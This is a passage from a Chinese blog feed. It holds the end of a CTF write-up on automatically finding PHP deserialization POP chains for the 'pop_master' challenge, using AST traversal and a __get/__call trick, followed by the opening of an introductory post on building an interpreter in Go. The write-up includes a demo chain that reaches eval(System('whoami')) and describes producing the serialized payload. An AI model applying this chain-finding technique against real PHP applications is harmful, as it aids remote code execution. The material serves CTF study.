</span><span class="w">            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Name(</span><span class="w">
</span><span class="w">                </span><span class="nt">parts</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">                    </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">method_exists</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">                </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Arg(</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
</span><span class="w">                    </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_PropertyFetch(</span><span class="w">
</span><span class="w">                        </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">this</span><span class="w">
</span><span class="w">                        </span><span class="l">)</span><span class="w">
</span><span class="w">                        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Identifier(</span><span class="w">
</span><span class="w">                            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">rHzhIHw</span><span class="w">
</span><span class="w">                        </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="nt">byRef</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                    </span><span class="nt">unpack</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">                </span><span class="nt">1</span><span class="p">:</span><span class="w"> </span><span class="l">Arg(</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
</span><span class="w">                    </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">Scalar_String(</span><span class="w">
</span><span class="w">                        </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">kzPUMm</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="nt">byRef</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                    </span><span class="nt">unpack</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="nt">stmts</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">            </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Stmt_Expression(</span><span class="w">
</span><span class="w">                </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_MethodCall(</span><span class="w">
</span><span class="w">                    </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_PropertyFetch(</span><span class="w">
</span><span class="w">                        </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">this</span><span class="w">
</span><span class="w">                        </span><span class="l">)</span><span class="w">
</span><span class="w">                        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Identifier(</span><span class="w">
</span><span class="w">                            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">rHzhIHw</span><span class="w">
</span><span class="w">                        </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Identifier(</span><span class="w">
</span><span class="w">                        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">kzPUMm</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">                        </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Arg(</span><span class="w">
</span><span class="w">                            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
</span><span class="w">                            </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                                </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">NEaSt</span><span class="w">
</span><span class="w">                            </span><span class="l">)</span><span class="w">
</span><span class="w">                            </span><span class="nt">byRef</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                            </span><span class="nt">unpack</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                        </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="nt">elseifs</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="nt">else</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
</span><span class="w">    </span><span class="l">)</span><span class="w">
</span></code></pre></div><p>经过一轮traverse后，AST变为了</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="nt">stmts</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">    </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Stmt_Expression(</span><span class="w">
</span><span class="w">        </span><span class="nt">expr</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_MethodCall(</span><span class="w">
</span><span class="w">            </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_PropertyFetch(</span><span class="w">
</span><span class="w">                </span><span class="nt">var</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">this</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">                </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Identifier(</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">rHzhIHw</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">Identifier(</span><span class="w">
</span><span class="w">                </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">kzPUMm</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="nt">args</span><span class="p">:</span><span class="w"> </span><span class="l">array(</span><span class="w">
</span><span class="w">                </span><span class="nt">0</span><span class="p">:</span><span class="w"> </span><span class="l">Arg(</span><span class="w">
</span><span class="w">                    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="w">
</span><span class="w">                    </span><span class="nt">value</span><span class="p">:</span><span class="w"> </span><span class="l">Expr_Variable(</span><span class="w">
</span><span class="w">                        </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l">NEaSt</span><span class="w">
</span><span class="w">                    </span><span class="l">)</span><span class="w">
</span><span class="w">                    </span><span class="nt">byRef</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                    </span><span class="nt">unpack</span><span class="p">:</span><span class="w"> </span><span class="kc">false</span><span class="w">
</span><span class="w">                </span><span class="l">)</span><span class="w">
</span><span class="w">            </span><span class="l">)</span><span class="w">
</span><span class="w">        </span><span class="l">)</span><span class="w">
</span><span class="w">    </span><span class="l">)</span><span class="w">
</span></code></pre></div><p>通过复原也就是</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">rHzhIHw</span><span class="o">-&gt;</span><span class="na">kzPUMm</span><span class="p">(</span><span class="nv">$NEaSt</span><span class="p">);</span>
</code></pre></div><p>刚开始很好奇为什么要加上这一个<code>visitor</code>，后来发现如果把这里的if分支全部优化，那么每个函数的开始开始可以分为4类：</p>
<ol>
<li>for 循环，然后赋值语句</li>
<li>if(a&gt;b)或者if(a&lt;b)，然后赋值语句</li>
<li>直接赋值</li>
<li>直接调用下一个跳转</li>
</ol>
<p>这也分别代表<code>ParseItem</code>函数中的4个分支，之后也就是也就是针对以上四种方式(准确说只有前三种，因为跳转到下一个函数,就已经开始新的<code>ParseItem</code>)的赋值语句，判断消毒是否有效。</p>
<p>后续用getCallName拿到后续跳用的方法，反复调用,知道没有后续的方法，也就是走到了<code>eval</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">function</span> <span class="nf">getCallName</span><span class="p">(</span><span class="nv">$stmts</span><span class="p">){</span>
    <span class="nv">$call</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span><span class="p">(</span><span class="nv">$stmts</span> <span class="o">-&gt;</span> <span class="na">stmts</span> <span class="k">as</span> <span class="nv">$stmt</span><span class="p">){</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$stmt</span> <span class="nx">instanceof</span> <span class="nx">Node\Stmt\Expression</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="na">expr</span> <span class="nx">instanceof</span> <span class="nx">Node\Expr\MethodCall</span> <span class="o">&amp;&amp;</span>
        <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="na">expr</span> <span class="o">-&gt;</span> <span class="na">var</span> <span class="nx">instanceof</span> <span class="nx">Node\Expr\PropertyFetch</span>
        <span class="p">){</span>
            <span class="nv">$call</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$stmt</span> <span class="o">-&gt;</span> <span class="na">expr</span> <span class="o">-&gt;</span> <span class="na">name</span> <span class="o">-&gt;</span> <span class="na">name</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nv">$call</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>其实走到这，我们就拿到了pop链的路线，不过作者还写了一个<code>ParseClassVisitor</code>,可以通过最后一次遍历pop数组即可拿到序列化后的字符串。</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/10/20211010231317.png" alt=""></p>
<p>本来我以为这就结束了,直到我们看到了方法5，实在不得不惊叹师傅对问题的钻研精神。</p>
<p>简单来说，以下的情况：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">A</span> <span class="k">extends</span> <span class="nx">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">FuncA</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span><span class="o">-&gt;</span><span class="na">FuncB</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">B</span> <span class="k">extends</span> <span class="nx">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">FuncB</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span><span class="o">-&gt;</span><span class="na">FuncC</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">class</span> <span class="nc">C</span> <span class="k">extends</span> <span class="nx">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="nf">FuncC</span><span class="p">(){</span>
        <span class="k">eval</span><span class="p">(</span><span class="nx">System</span><span class="p">(</span><span class="s1">&#39;whoami&#39;</span><span class="p">));</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$demo</span> <span class="o">=</span><span class="k">new</span> <span class="nx">A</span><span class="p">;</span>
<span class="nv">$demo</span><span class="o">-&gt;</span><span class="na">FuncA</span><span class="p">();</span>
</code></pre></div><p>我们该怎么写Father类，当调用<code>$demo-&gt;FuncA();</code>,可以自动调用到eval里的函数。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Father</span><span class="p">{</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$name</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">return</span> <span class="nv">$this</span> <span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__call</span><span class="p">(</span><span class="nv">$funcName</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nx">get_declared_classes</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$index</span><span class="o">=&gt;</span><span class="nv">$value</span><span class="p">){</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$index</span><span class="o">&gt;=</span><span class="mi">176</span><span class="p">){</span>
                <span class="k">try</span> <span class="p">{</span>
                    <span class="nv">$obj</span> <span class="o">=</span> <span class="k">new</span> <span class="nv">$value</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="nx">method_exists</span><span class="p">(</span><span class="nv">$obj</span><span class="p">,</span> <span class="nv">$funcName</span><span class="p">))</span> <span class="p">{</span>
                        <span class="nv">$obj</span><span class="o">-&gt;</span><span class="nv">$funcName</span><span class="p">();</span>
                    <span class="p">}</span>
                <span class="p">}</span><span class="k">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nv">$e</span><span class="p">){}</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>这样看，当调用<code>$this-&gt;a-&gt;FuncB();</code>,因为当前没有<code>a</code>属性，调用<code>__get</code>相当变成了<code>$this-&gt;FuncB()</code>,然后在<code>__call</code>中遍历所有类，找到有这个方法的类并以此反复调用下去。而如果要记录这样的一条pop链，只需要在<code>__get()</code>和<code>__call()</code>方法中做一些简单手脚即可。</p>
<p>不过虽然这样的方法看似自动帮我们生成了pop链，但是还是有一些弊端。因为作者实现已经用python正则完善了对数据流的优化，把很多变量名以及方法进行了替换。但在实际环境中想要自动化生成pop链我感觉还是很困难，毕竟数据流的动向实在是太复杂了。</p>
<p>总的来说还是感谢师傅分享了这样一篇文章，收获良多，也希望自己今后多总结思考，毕竟ctf的乐趣不也在于此吗？</p>
<p>*<strong>参考</strong>：<a href="https://www.freebuf.com/articles/web/279680.html">pop_master的花式解题思路</a></p>
]]></content>
		</item>
		
		<item>
			<title>漫谈解释器</title>
			<link>https://theoyu.top/posts/talk-about-interpreter/</link>
			<pubDate>Sun, 19 Sep 2021 22:24:32 +0800</pubDate>
			
			<guid>https://theoyu.top/posts/talk-about-interpreter/</guid>
			<description>前言 开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。
主要参考以下两本教材
 编译器设计 Writing An Interpreter In Go  概述 编译型语言 有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序，比如C、c++、Golang等，这种编程语言称为编译型语言，使用的转换工具称为编译器。
解释型语言 有的编程语言可以一边执行一边转换，不会生成可执行程序，比如 JavaScript、PHP等。这种编程语言称为解释型语言，使用的转换工具称为解释器。
编译+解释 严格意义上python不算是单纯的解释型语言，其还会编译为pyc字节码，由pvm解释执行这个字节码文件，每一次负责将一条字节码文件语句翻译成cpu可以直接执行的机器代码。
java从源代码编译为字节码，然后在JVM上运行字节码执行，JVM是一种字节码的解释器，JVM的实现包括一个运行时的编译器，称为JIT(just-in-time)编译器，其最大的优势在于可以在运行时进行及时优化。更多关于JIT的知识可参考这篇文章.
在知乎看到一个很有意思的提问：
 我之前看知乎上有人分析，编译型语言能够直接生成二进制代码（Windows下就是EXE或DLL吧），而解释型语言不会生成二进制代码，最多道二进制代码的前一步。
我对这种解释有些无法理解，感觉这似乎不是他们的本质吧。Python是一个解释性语言，但我记得Python可以下载一个包，能够将Python直接编译为EXE可执行程序，难道说，我下载了这个包之后，Python就从解释型语言变为编译型语言了不成？
是这个概念区分本身就有严重的先天缺陷，还是我的理解本身有错误？
 其中无论对与否，比较戳中我的回答：
 语言只是规定语法，最后用这语言写出来的代码怎么翻译成机器码，怎么运行，还需要一个实现。这个实现可以是编译器也可以是解释器。
所以你也可以做一个python的编译器或者C语言的解释器
 编译器构成 现在国内外大多教材(虽然我都没看过)在编译器这一块是头重脚轻的，比重前端&amp;raquo;后端&amp;gt;优化器，虽然对于编译器这样非常不合理，不过站在学习静态分析的方向，更多的关注点还是放在前端，当然优化部分也不可忽视，比如这个值得反复揣摩的问答。
前端 前端部分，其实现有很多工具已经帮我们实现了
词法分析器 源代码在计算机『眼中』其实是一团乱麻。无法被理解的字符串在计算器看来并没有什么区别，为了理解这些字符我们需要做的第一件事情就是将字符串分组，这能够降低理解字符串的成本，简化源代码的分析过程。所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 Token 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（lexer）。
对于词法分析器而言，最繁杂的一步，也就是需要我们把这门语言可能用到的token全部枚举出来
package token const( // Identifiers + literals 	IDENT = &amp;#34;IDENT&amp;#34; // add, foobar, x, y, ... 	INT = &amp;#34;INT&amp;#34; // 1343456  // Operators 	ASSIGN = &amp;#34;=&amp;#34; PLUS = &amp;#34;+&amp;#34; // Delimiters 	COMMA = &amp;#34;,&amp;#34; SEMICOLON = &amp;#34;;&amp;#34; LPAREN = &amp;#34;(&amp;#34; // Keywords 	FUNCTION = &amp;#34;FUNCTION&amp;#34; LET = &amp;#34;LET&amp;#34; TRUE = &amp;#34;TRUE&amp;#34; .</description>
			<content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210901224626.png" alt="image-20210901150504552"></p>
<h2 id="前言">前言</h2>
<p>开个新坑，本来是打算学学编译器的，但是发现基础太薄弱了，就先学习解释器相关吧，刚好大创也需要这一块的知识。</p>
<p>主要参考以下两本教材</p>
<ul>
<li><a href="https://book.douban.com/subject/20436488/">编译器设计</a></li>
<li><a href="https://interpreterbook.com/">Writing An Interpreter In Go</a></li>
</ul>
<h2 id="概述">概述</h2>
<h3 id="编译型语言">编译型语言</h3>
<p>有的编程语言要求必须提前将所有源代码一次性转换成二进制指令，也就是生成一个可执行程序，比如C、c++、Golang等，这种编程语言称为编译型语言，使用的转换工具称为编译器。</p>
<h3 id="解释型语言">解释型语言</h3>
<p>有的编程语言可以一边执行一边转换，不会生成可执行程序，比如 JavaScript、PHP等。这种编程语言称为解释型语言，使用的转换工具称为解释器。</p>
<h3 id="编译解释">编译+解释</h3>
<p>严格意义上python不算是单纯的解释型语言，其还会编译为pyc字节码，由pvm解释执行这个字节码文件，每一次负责将一条字节码文件语句翻译成cpu可以直接执行的机器代码。</p>
<p>java从源代码编译为字节码，然后在JVM上运行字节码执行，JVM是一种字节码的解释器，JVM的实现包括一个运行时的编译器，称为JIT(just-in-time)编译器，其最大的优势在于<strong>可以在运行时进行及时优化</strong>。更多关于JIT的知识可参考<a href="https://aboullaite.me/understanding-jit-compiler-just-in-time-compiler/">这篇文章</a>.</p>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210901224636.png" alt="image-20210901173603017"></p>
<p>在知乎看到一个很有意思的提问：</p>
<blockquote>
<p>我之前看知乎上有人分析，编译型语言能够直接生成二进制代码（Windows下就是EXE或DLL吧），而解释型语言不会生成二进制代码，最多道二进制代码的前一步。</p>
<p>我对这种解释有些无法理解，感觉这似乎不是他们的本质吧。Python是一个解释性语言，但我记得Python可以下载一个包，能够将Python直接编译为EXE可执行程序，难道说，我下载了这个包之后，Python就从解释型语言变为编译型语言了不成？</p>
<p>是这个概念区分本身就有严重的先天缺陷，还是我的理解本身有错误？</p>
</blockquote>
<p>其中无论对与否，比较戳中我的回答：</p>
<blockquote>
<p>语言只是规定语法，最后用这语言写出来的代码怎么翻译成机器码，怎么运行，还需要一个实现。这个实现可以是编译器也可以是解释器。</p>
<p>所以你也可以做一个python的编译器或者C语言的解释器</p>
</blockquote>
<h2 id="编译器构成">编译器构成</h2>
<p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210902230041.png" alt="image-20210902230038132"></p>
<p>现在国内外大多教材(虽然我都没看过)在编译器这一块是头重脚轻的，比重前端&raquo;后端&gt;优化器，虽然对于编译器这样非常不合理，不过站在学习静态分析的方向，更多的关注点还是放在前端，当然优化部分也不可忽视，比如这个值得反复揣摩的<a href="https://www.zhihu.com/question/27730062/answer/44638989">问答</a>。</p>
<h3 id="前端">前端</h3>
<p>前端部分，其实现有很多工具已经帮我们实现了</p>
<h4 id="词法分析器">词法分析器</h4>
<p>源代码在计算机『眼中』其实是一团乱麻。无法被理解的字符串在计算器看来并没有什么区别，为了理解这些字符我们需要做的第一件事情就是<strong>将字符串分组</strong>，这能够降低理解字符串的成本，简化源代码的分析过程。所有的编译过程其实都是从解析代码的源文件开始的，词法分析的作用就是解析源代码文件，它将文件中的字符串序列转换成 <strong>Token</strong> 序列，方便后面的处理和解析，我们一般会把执行词法分析的程序称为词法解析器（<strong>lexer</strong>）。</p>
<p>对于词法分析器而言，最繁杂的一步，也就是需要我们把这门语言可能用到的token全部枚举出来</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kn">package</span> <span class="nx">token</span>
<span class="kd">const</span><span class="p">(</span>
	<span class="c1">// Identifiers + literals
</span><span class="c1"></span>	<span class="nx">IDENT</span> <span class="p">=</span> <span class="s">&#34;IDENT&#34;</span> <span class="c1">// add, foobar, x, y, ...
</span><span class="c1"></span>	<span class="nx">INT</span>   <span class="p">=</span> <span class="s">&#34;INT&#34;</span>   <span class="c1">// 1343456
</span><span class="c1"></span>
	<span class="c1">// Operators
</span><span class="c1"></span>	<span class="nx">ASSIGN</span>   <span class="p">=</span> <span class="s">&#34;=&#34;</span>
	<span class="nx">PLUS</span>     <span class="p">=</span> <span class="s">&#34;+&#34;</span>
  
  <span class="c1">// Delimiters
</span><span class="c1"></span>	<span class="nx">COMMA</span>     <span class="p">=</span> <span class="s">&#34;,&#34;</span>
	<span class="nx">SEMICOLON</span> <span class="p">=</span> <span class="s">&#34;;&#34;</span>
	<span class="nx">LPAREN</span> <span class="p">=</span> <span class="s">&#34;(&#34;</span>
  
  <span class="c1">// Keywords
</span><span class="c1"></span>	<span class="nx">FUNCTION</span> <span class="p">=</span> <span class="s">&#34;FUNCTION&#34;</span>
	<span class="nx">LET</span>      <span class="p">=</span> <span class="s">&#34;LET&#34;</span>
	<span class="nx">TRUE</span>     <span class="p">=</span> <span class="s">&#34;TRUE&#34;</span>
  <span class="o">......</span>
<span class="p">)</span>
</code></pre></div><p>我们采用类似解释器模式的python，逐行读取源文件，这里需要介绍两个函数</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kd">func</span> <span class="p">(</span><span class="nx">l</span> <span class="o">*</span><span class="nx">Lexer</span><span class="p">)</span> <span class="nf">readChar</span><span class="p">()</span> <span class="p">{}</span>
<span class="kd">func</span> <span class="p">(</span><span class="nx">l</span> <span class="o">*</span><span class="nx">Lexer</span><span class="p">)</span> <span class="nf">peekChar</span><span class="p">()</span> <span class="kt">byte</span> <span class="p">{}</span>
</code></pre></div><p><code>readChar</code>用于读取当前位置的字符，<code>peekChar</code>用于(看一眼)下个位置的字符，因为比如当读取到<code>=</code>时，无法断定token是赋值还是等于，需要通过下一个字符判断。</p>
<p>这里还有一个问题，我们如何判断一个变量呢，比如<code>let x = 3</code>,对于词法分析器而言<code>let</code>和<code>x</code> 是没有区别的，这里我们需要创建一个map</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang"><span class="kn">package</span> <span class="nx">token</span>
<span class="kd">var</span> <span class="nx">keywords</span> <span class="p">=</span> <span class="kd">map</span><span class="p">[</span><span class="kt">string</span><span class="p">]</span><span class="nx">TokenType</span><span class="p">{</span>
	<span class="s">&#34;fn&#34;</span><span class="p">:</span>     <span class="nx">FUNCTION</span><span class="p">,</span>
	<span class="s">&#34;let&#34;</span><span class="p">:</span>    <span class="nx">LET</span><span class="p">,</span>
	<span class="s">&#34;true&#34;</span><span class="p">:</span>   <span class="nx">TRUE</span><span class="p">,</span>
	<span class="s">&#34;false&#34;</span><span class="p">:</span>  <span class="nx">FALSE</span><span class="p">,</span>
	<span class="s">&#34;if&#34;</span><span class="p">:</span>     <span class="nx">IF</span><span class="p">,</span>
	<span class="s">&#34;else&#34;</span><span class="p">:</span>   <span class="nx">ELSE</span><span class="p">,</span>
	<span class="s">&#34;return&#34;</span><span class="p">:</span> <span class="nx">RETURN</span><span class="p">,</span>
<span class="p">}</span>

<span class="kd">func</span> <span class="nf">LookupIdent</span><span class="p">(</span><span class="nx">ident</span> <span class="kt">string</span><span class="p">)</span> <span class="nx">TokenType</span> <span class="p">{</span>
	<span class="k">if</span> <span class="nx">tok</span><span class="p">,</span> <span class="nx">ok</span> <span class="o">:=</span> <span class="nx">keywords</span><span class="p">[</span><span class="nx">ident</span><span class="p">];</span> <span class="nx">ok</span> <span class="p">{</span>
		<span class="k">return</span> <span class="nx">tok</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="nx">IDENT</span>
<span class="p">}</span>
</code></pre></div><p>这样每次当我们读完一串字符串，就进行<code>LookupIdent</code>寻找是否含有键值。</p>
<p>最后反复调用一个<code>NextToken()</code>函数，其内部调用<code>readChar()</code>以及token判断，这样最简易的词法分析器就暂时完成。</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-golang" data-lang="golang">		<span class="k">for</span> <span class="nx">tok</span> <span class="o">:=</span> <span class="nx">l</span><span class="p">.</span><span class="nf">NextToken</span><span class="p">();</span> <span class="nx">tok</span><span class="p">.</span><span class="nx">Type</span> <span class="o">!=</span> <span class="nx">token</span><span class="p">.</span><span class="nx">EOF</span><span class="p">;</span> <span class="nx">tok</span> <span class="p">=</span> <span class="nx">l</span><span class="p">.</span><span class="nf">NextToken</span><span class="p">()</span> <span class="p">{</span>
			<span class="nx">fmt</span><span class="p">.</span><span class="nf">Printf</span><span class="p">(</span><span class="s">&#34;%+v\n&#34;</span><span class="p">,</span> <span class="nx">tok</span><span class="p">)</span>
		<span class="p">}</span>
</code></pre></div><p><img src="https://cdn.jsdelivr.net/gh/yuuuuu422/Myimages/img/2021/09/20210921114712.png" alt="image-20210921114710885"></p>
<h4 id="语法分析器">语法分析器</h4>
<p>语法分析器就根据我们所定义的形式文法（<strong>Grammar</strong>）识别出词法分析所得到token的结构，从而构造出一颗语法树(<strong>AST</strong> abstract syntax tree),仅仅得到AST是不够的，还得对AST进行语义检查，保证其结构在语义上也是说得通的。</p>
<blockquote>
<p>这一块真是看了好久才<del>看明白</del>,其实是英语太拉垮了，拿着源码调试反而好理解一些。</p>
</blockquote>
<p>拿最简单的<code>let</code>为例，<code>let</code>表达式通常是这样的：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-haskell" data-lang="haskell"><span class="kr">let</span> <span class="n">x</span> <span class="ow">=</span> <span class="mi">10</span><span class="p">;</span> 
<span class="kr">let</span> <span class="n">y</span> <span class="ow">=</span> <span class="mi">15</span><span class="p">;</span>
<span class="kr">let</span> <span class="n">add</span> <span class="ow">=</span> <span class="n">fn</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">)</span> <span class="p">{</span> 
	<span class="n">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">};</span>
<span class="o">......</span>
<span class="kr">let</span> <span class="o">&lt;</span><span class="n">identifier</span><span class="o">&gt;</span> <span class="ow">=</span> <span class="o">&lt;</span><span class="n">expression</span><span class="o">&gt;</span><span class="p">;</span>
</code></pre></div><p>在我们创建结点之前，我们需要明白<code>statements</code>和<code>expressions</code>的区别，这两者本质的区别在于是否会产生值，比如声明 <code>let x =5</code>并不会产生值，但是<code>5</code>会.<code>return 5</code>不会产生值而<code>add(5+5)</code>会。(怎么感觉越说越糊涂)简单来说<code>statements</code>就是一句完整的语句，而<code>expressions</code>像是c++中的右值，需要一个变量去接收。现在我们创建两种类型的结点：</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">ast</span>
<span class="c1">// The base Node interface
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">Node</span> <span class="kd">interface</span> <span class="p">{</span>
	<span class="nf">TokenLiteral</span><span class="p">()</span> <span class="kt">string</span>
	<span class="nf">String</span><span class="p">()</span> <span class="kt">string</span>
<span class="p">}</span>

<span class="c1">// All statement nodes implement this
</span><span class="c1"></span><span class="kd">type</span> <span class="nx">Statement</span> <span class="kd">interface</span> <span class="p">{</span>
